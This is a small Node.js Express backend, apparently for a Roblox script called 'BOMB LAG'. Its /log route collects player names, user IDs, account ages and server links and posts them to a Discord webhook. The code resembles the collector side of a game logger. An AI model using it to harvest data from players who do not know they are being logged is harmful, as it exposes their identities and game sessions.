const express = require("express");

const app = express();
app.use(express.json());

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/XXXXX/XXXXX";

/* Ruta test (opcional pero útil) */
app.get("/", (req, res) => {
  res.send("BOMB LAG backend online");
});

app.post("/log", async (req, res) => {
  try {
    const data = req.body;

    if (!data || !data.playerName || !data.serverLink) {
      return res.status(400).json({ error: "Invalid data" });
    }

    const embed = {
      title: "📡 New Roblox Server Link Logged",
      color: 0xff4c4c,
      fields: [
        { name: "👤 Player", value: String(data.playerName), inline: true },
        { name: "🆔 UserId", value: String(data.userId), inline: true },
        { name: "📆 Account Age", value: `${data.accountAge} days`, inline: true },
        { name: "🎮 Game", value: data.gameName || "Unknown", inline: false },
        { name: "🔗 Server Link", value: data.serverLink, inline: false },
        { name: "⏰ Time", value: `<t:${data.time}:F>`, inline: false }
      ]
    };

    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });

    console.log("✅ Webhook sent:", data.playerName);
    res.json({ success: true });

  } catch (err) {
    console.error("❌ ERROR:", err);
    res.status(500).json({ error: "Internal error" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("🚀 Backend running on port", PORT);
});
